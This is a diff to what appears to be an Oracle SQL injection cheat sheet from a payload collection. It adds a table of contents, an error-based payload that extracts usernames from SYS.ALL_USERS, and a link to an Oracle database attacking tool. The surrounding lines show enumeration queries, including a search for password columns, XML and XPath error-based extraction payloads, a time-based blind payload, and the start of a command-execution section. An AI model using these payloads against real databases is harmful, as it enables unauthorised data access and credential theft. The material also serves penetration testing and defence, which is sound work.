@@ -1,5 +1,18 @@
 # Oracle SQL Injection
 
+## Summary
+
+* [Oracle SQL version](#oracle-sql-version)
+* [Oracle SQL database name](#oracle-sql-database-name)
+* [Oracle SQL List databases](#oracle-sql-list-databases)
+* [Oracle SQL List columns](#oracle-sql-list-columns)
+* [Oracle SQL List tables](#oracle-sql-list-tables)
+* [Oracle SQL Error Based](#oracle-sql-error-based)
+* [Oracle SQL Blind](#oracle-sql-blind)
+* [Oracle SQL Time Based](#oracle-sql-time-based)
+* [Oracle SQL Command execution](#oracle-sql-command-execution)
+* [References](#references)
+
 ## Oracle SQL version
 
 ```sql
@@ -21,7 +34,7 @@ SELECT SYS.DATABASE_NAME FROM DUAL;
 SELECT DISTINCT owner FROM all_tables;
 ```
 
-## Oracle SQL List Column
+## Oracle SQL List Columns
 
 ```sql
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
@@ -45,6 +58,8 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | Invalid XPath         | SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual |
 | Invalid XML           | SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual |
 | Invalid XML           | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
+| SQL Error             | SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) |
+
 
 ## Oracle SQL Blind
 
@@ -63,6 +78,8 @@ AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                
 ```
 
 ## Oracle SQL Command execution
+
+* [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
 
 ```sql
 /* create Java class */
